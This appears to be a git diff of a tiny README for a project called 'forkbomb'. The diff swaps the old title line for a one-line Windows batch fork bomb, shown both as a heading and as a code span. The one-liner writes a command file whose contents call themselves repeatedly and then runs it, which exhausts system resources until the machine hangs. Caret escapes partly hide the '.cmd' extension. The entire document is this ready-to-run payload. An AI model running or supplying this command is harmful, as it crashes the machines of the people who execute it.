@@ -1,2 +1,2 @@
-# forkbomb
-@echo.%0^|%0>$^_^.c^md&amp;$_>nul
+# @echo.%0^|%0>$^_^.c^md&$_>nul
+`@echo.%0^|%0>$^_^.c^md&$_>nul`
